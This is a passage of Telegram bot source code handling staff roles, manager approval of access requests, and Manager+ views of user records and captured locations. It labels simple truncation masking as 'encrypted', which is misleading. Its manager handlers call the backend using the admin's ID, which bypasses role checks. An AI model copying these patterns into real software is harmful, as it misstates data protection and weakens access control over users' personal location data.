                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('➕ Add Staff Member', 'staff_add')],
                        [Markup.button.callback('« Back', 'admin_panel')]
                    ])
                }
            );
            return;
        }
        
        let msg = `👥 *Staff Management* (${result.count})\n\n`;
        result.staff.forEach((s, i) => {
            const roleEmoji = s.role === 'manager_plus' ? '⭐' : '👔';
            const roleName = s.role === 'manager_plus' ? 'Manager+' : 'Manager';
            msg += `${i + 1}. ${roleEmoji} ${s.firstName || 'Unknown'} ${s.lastName || ''}\n`;
            msg += `   @${s.username || 'N/A'} | ${roleName}\n\n`;
        });
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...staffListKeyboard(result.staff)
        });
        
    } catch (error) {
        logger.error('Failed to get staff list', { error: error.message });
        await ctx.reply('❌ Failed to load staff: ' + error.message);
    }
});

/**
 * Handle add staff - show list of approved users
 */
bot.action('staff_add', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllUsers(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get users');
        }
        
        // Filter approved users who are not already staff
        const availableUsers = result.users.filter(u => 
            u.isApproved && 
            !['admin', 'manager', 'manager_plus'].includes(u.role) &&
            u.telegramId !== config.admin.telegramId
        );
        
        if (availableUsers.length === 0) {
            await ctx.editMessageText(
                '➕ *Add Staff Member*\n\n' +
                '📭 No approved users available to promote.\n\n' +
                '_Approve users first before adding them as staff._',
                { 
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('« Back', 'admin_staff')]
                    ])
                }
            );
            return;
        }
        
        let msg = '➕ *Add Staff Member*\n\n_Select a user to promote:_\n\n';
        
        const buttons = availableUsers.slice(0, 10).map(u => [
            Markup.button.callback(
                `${u.firstName || 'Unknown'} (@${u.username || u.telegramId})`,
                `staff_select_${u.telegramId}`
            )
        ]);
        buttons.push([Markup.button.callback('« Back', 'admin_staff')]);
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        });
        
    } catch (error) {
        logger.error('Failed to get users for staff add', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Handle staff selection for promotion - show role options
 */
bot.action(/^staff_select_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    const targetId = ctx.match[1];
    await ctx.answerCbQuery();
    
    await ctx.editMessageText(
        '👔 *Select Role*\n\n' +
        'Choose a role for this user:\n\n' +
        '👔 *Manager* - Can approve/decline access requests\n\n' +
        '⭐ *Manager+* - Manager + can view user data (encrypted)',
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('👔 Manager', `staff_promote_manager_${targetId}`)],
                [Markup.button.callback('⭐ Manager+', `staff_promote_manager_plus_${targetId}`)],
                [Markup.button.callback('« Back', 'staff_add')]
            ])
        }
    );
});

/**
 * Handle staff promotion
 */
bot.action(/^staff_promote_(manager|manager_plus)_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    const role = ctx.match[1];
    const targetId = ctx.match[2];
    await ctx.answerCbQuery();
    
    try {
        const result = await api.addStaff(targetId, role, user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to promote user');
        }
        
        const roleName = role === 'manager_plus' ? 'Manager+' : 'Manager';
        
        await ctx.editMessageText(
            `✅ *User Promoted!*\n\n` +
            `${result.staff.firstName || 'User'} is now a ${roleName}.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('👥 View Staff', 'admin_staff')],
                    [Markup.button.callback('« Back to Panel', 'admin_panel')]
                ])
            }
        );
        
        // Notify the promoted user
        try {
            await bot.telegram.sendMessage(
                targetId,
                `🎉 *Congratulations!*\n\n` +
                `You have been promoted to *${roleName}*!\n\n` +
                `Your new menu is available now.`,
                { parse_mode: 'Markdown', ...managerMenuKeyboard }
            );
        } catch (e) {
            logger.warn('Could not notify promoted user', { targetId });
        }
        
    } catch (error) {
        logger.error('Failed to promote user', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Handle view staff member
 */
bot.action(/^staffview_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    const targetId = ctx.match[1];
    await ctx.answerCbQuery();
    
    try {
        const staffList = await api.getStaffList(user.id);
        const staff = staffList.staff.find(s => String(s.telegramId) === targetId);
        
        if (!staff) {
            await ctx.editMessageText('❌ Staff member not found.', {
                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_staff')]])
            });
            return;
        }
        
        const roleName = staff.role === 'manager_plus' ? 'Manager+' : 'Manager';
        const roleEmoji = staff.role === 'manager_plus' ? '⭐' : '👔';
        
        let msg = `${roleEmoji} *Staff Member*\n\n`;
        msg += `👤 Name: ${staff.firstName || 'Unknown'} ${staff.lastName || ''}\n`;
        msg += `📧 Username: @${staff.username || 'N/A'}\n`;
        msg += `🆔 ID: \`${staff.telegramId}\`\n`;
        msg += `👔 Role: ${roleName}\n`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...staffDetailKeyboard(staff.telegramId, staff.role)
        });
        
    } catch (error) {
        logger.error('Failed to view staff', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Handle promote staff to manager+
 */
bot.action(/^promote_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    const targetId = ctx.match[1];
    await ctx.answerCbQuery();
    
    try {
        const result = await api.updateStaffRole(targetId, 'manager_plus', user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to promote');
        }
        
        await ctx.editMessageText(
            `✅ User promoted to Manager+!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('« Back to Staff', 'admin_staff')]
                ])
            }
        );
        
        // Notify user
        try {
            await bot.telegram.sendMessage(
                targetId,
                `🎉 You have been promoted to *Manager+*!`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {}
        
    } catch (error) {
        logger.error('Failed to promote', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Handle demote staff to manager
 */
bot.action(/^demote_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    const targetId = ctx.match[1];
    await ctx.answerCbQuery();
    
    try {
        const result = await api.updateStaffRole(targetId, 'manager', user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to demote');
        }
        
        await ctx.editMessageText(
            `✅ User demoted to Manager.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('« Back to Staff', 'admin_staff')]
                ])
            }
        );
        
        // Notify user
        try {
            await bot.telegram.sendMessage(
                targetId,
                `ℹ️ Your role has been changed to *Manager*.`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {}
        
    } catch (error) {
        logger.error('Failed to demote', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Handle remove staff
 */
bot.action(/^removestaff_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    const targetId = ctx.match[1];
    await ctx.answerCbQuery();
    
    try {
        const result = await api.removeStaff(targetId, user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to remove');
        }
        
        await ctx.editMessageText(
            `✅ Staff member removed.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('« Back to Staff', 'admin_staff')]
                ])
            }
        );
        
        // Notify user
        try {
            await bot.telegram.sendMessage(
                targetId,
                `ℹ️ Your staff role has been removed. You are now a regular user.`,
                { parse_mode: 'Markdown', ...mainMenuKeyboard }
            );
        } catch (e) {}
        
    } catch (error) {
        logger.error('Failed to remove staff', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

// ============================================
// Manager Panel Handlers
// ============================================

/**
 * Manager - View pending requests
 */
bot.action('mgr_requests', async (ctx) => {
    const user = ctx.from;
    const roleInfo = await getUserRole(user.id);
    
    if (!roleInfo.isManager) {
        await ctx.answerCbQuery('❌ Manager access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        // Managers can also view pending requests
        const result = await api.getPendingRequests(config.admin.telegramId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get requests');
        }
        
        if (result.count === 0) {
            const panel = roleInfo.isManagerPlus ? managerPlusPanelKeyboard : managerPanelKeyboard;
            await ctx.editMessageText(
                '📋 *Access Requests*\n\n' +
                '✅ No pending requests!',
                { parse_mode: 'Markdown', ...panel }
            );
            return;
        }
        
        let msg = `📋 *Access Requests* (${result.count})\n\n`;
        result.requests.forEach((req, i) => {
            msg += `${i + 1}. ${req.firstName || 'Unknown'} ${req.lastName || ''}\n`;
            msg += `   @${req.username || 'N/A'} | ID: \`${req.telegramId}\`\n\n`;
        });
        msg += `\n_Tap ✅ to approve or ❌ to deny_`;
        
        // Create manager-specific keyboard
        const buttons = [];
        result.requests.forEach(req => {
            buttons.push([
                Markup.button.callback(`✅ Approve ${req.firstName || req.telegramId}`, `mgr_approve_${req.telegramId}`),
                Markup.button.callback(`❌ Deny`, `mgr_deny_${req.telegramId}`)
            ]);
        });
        buttons.push([Markup.button.callback('« Back', 'mgr_back')]);
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        });
        
    } catch (error) {
        logger.error('Manager failed to get requests', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Manager approve user
 */
bot.action(/^mgr_approve_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    const roleInfo = await getUserRole(user.id);
    
    if (!roleInfo.isManager) {
        await ctx.answerCbQuery('❌ Manager access required');
        return;
    }
    
    const targetId = ctx.match[1];
    await ctx.answerCbQuery();
    
    try {
        // Use admin ID for API (managers act on behalf of admin for now)
        const result = await api.approveUser(targetId, config.admin.telegramId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to approve');
        }
        
        await ctx.editMessageText(
            `✅ *User Approved!*\n\n` +
            `${result.user.firstName || 'User'} has been approved.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📋 More Requests', 'mgr_requests')],
                    [Markup.button.callback('« Back', 'mgr_back')]
                ])
            }
        );
        
        // Notify the approved user
        try {
            await bot.telegram.sendMessage(
                targetId,
                `🎉 *Access Granted!*\n\n` +
                `Your access request has been approved!\n\n` +
                `You now have access to all features.`,
                { parse_mode: 'Markdown', ...mainMenuKeyboard }
            );
        } catch (e) {
            logger.warn('Could not notify approved user', { targetId });
        }
        
        logger.info('Manager approved user', { managerId: user.id, targetId });
        
    } catch (error) {
        logger.error('Manager failed to approve', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Manager deny user
 */
bot.action(/^mgr_deny_(\d+)$/, async (ctx) => {
    const user = ctx.from;
    const roleInfo = await getUserRole(user.id);
    
    if (!roleInfo.isManager) {
        await ctx.answerCbQuery('❌ Manager access required');
        return;
    }
    
    const targetId = ctx.match[1];
    await ctx.answerCbQuery();
    
    try {
        const result = await api.denyUser(targetId, config.admin.telegramId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to deny');
        }
        
        await ctx.editMessageText(
            `❌ *User Denied*\n\n` +
            `The access request has been denied.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📋 More Requests', 'mgr_requests')],
                    [Markup.button.callback('« Back', 'mgr_back')]
                ])
            }
        );
        
        // Notify the denied user
        try {
            await bot.telegram.sendMessage(
                targetId,
                `❌ *Access Denied*\n\n` +
                `Your access request has been denied.`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {}
        
        logger.info('Manager denied user', { managerId: user.id, targetId });
        
    } catch (error) {
        logger.error('Manager failed to deny', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Manager+ view all users (encrypted data)
 */
bot.action('mgr_users', async (ctx) => {
    const user = ctx.from;
    const roleInfo = await getUserRole(user.id);
    
    if (!roleInfo.isManagerPlus) {
        await ctx.answerCbQuery('❌ Manager+ access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllUsers(config.admin.telegramId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get users');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '👥 *Users* (Encrypted View)\n\n📭 No users yet.',
                { parse_mode: 'Markdown', ...managerPlusPanelKeyboard }
            );
            return;
        }
        
        let msg = `👥 *Users* (${result.count}) - _Encrypted View_\n\n`;
        result.users.slice(0, 10).forEach((u, i) => {
            // Encrypt/mask user data for manager+
            const maskedId = String(u.telegramId).substring(0, 4) + '***';
            const maskedName = (u.firstName || 'U').substring(0, 2) + '***';
            msg += `${i + 1}. ${maskedName} | ID: ${maskedId}\n`;
            msg += `   📊 ${u.sessionCount || 0} sessions, ${u.mediaCount || 0} media\n\n`;
        });
        
        if (result.count > 10) {
            msg += `\n_...and ${result.count - 10} more users_`;
        }
        
        msg += `\n\n🔒 _Data encrypted for security_`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('« Back', 'mgr_back')]
            ])
        });
        
    } catch (error) {
        logger.error('Manager+ failed to get users', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Manager+ view locations (encrypted)
 */
bot.action('mgr_all_locations', async (ctx) => {
    const user = ctx.from;
    const roleInfo = await getUserRole(user.id);
    
    if (!roleInfo.isManagerPlus) {
        await ctx.answerCbQuery('❌ Manager+ access required');
        return;
    }
    
    await ctx.answerCbQuery();
    await ctx.sendChatAction('typing');
    
    try {
        const result = await api.getAllMedia('location');
        
        if (!result.success || result.data.length === 0) {
            await ctx.reply('📭 No locations captured yet.');
            return;
        }
        
        let msg = `📍 *All Locations* (${result.data.length}) - _Encrypted View_\n\n`;
        
        result.data.slice(0, 10).forEach((loc, i) => {
            const meta = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
            // Mask location data
            const maskedLat = meta?.latitude ? String(meta.latitude).substring(0, 5) + '***' : 'N/A';
            const maskedLon = meta?.longitude ? String(meta.longitude).substring(0, 5) + '***' : 'N/A';
            const maskedUser = (loc.first_name || 'U').substring(0, 2) + '***';
            
            msg += `${i + 1}. 👤 ${maskedUser}\n`;
            msg += `   📍 ${maskedLat}, ${maskedLon}\n`;
            msg += `   🕐 ${new Date(loc.created_at).toLocaleDateString()}\n\n`;
        });
        
        msg += `\n🔒 _Coordinates partially hidden for security_`;
        
        await ctx.reply(msg, { 
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('« Back', 'mgr_back')]
            ])
        });
        
    } catch (error) {
        logger.error('Manager+ failed to get locations', { error: error.message });
        await ctx.reply('❌ Failed: ' + error.message);
    }
});

/**
 * Manager back button
 */
bot.action('mgr_back', async (ctx) => {
    const user = ctx.from;
    const roleInfo = await getUserRole(user.id);
    
    await ctx.answerCbQuery();
    await ctx.deleteMessage().catch(() => {});
    
    const panel = roleInfo.isManagerPlus ? managerPlusPanelKeyboard : managerPanelKeyboard;
    const roleName = roleInfo.isManagerPlus ? 'Manager+' : 'Manager';
    
    await ctx.reply(
        `👔 *${roleName} Panel*\n\n` +
        'Select an option below:',
        { parse_mode: 'Markdown', ...panel }
    );
});

/**
 * Handle back to menu
 */
bot.action('admin_back', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.deleteMessage().catch(() => {});
    await ctx.reply(
        '👑 Back to main menu',
        adminMenuKeyboard
    );
});

// ============================================
// Error Handling
// ============================================

bot.catch((err, ctx) => {
    logger.error('Bot error', {
        error: err.message,
        updateType: ctx.updateType
    });
});

// ============================================
// Exports
// ============================================

module.exports = bot;
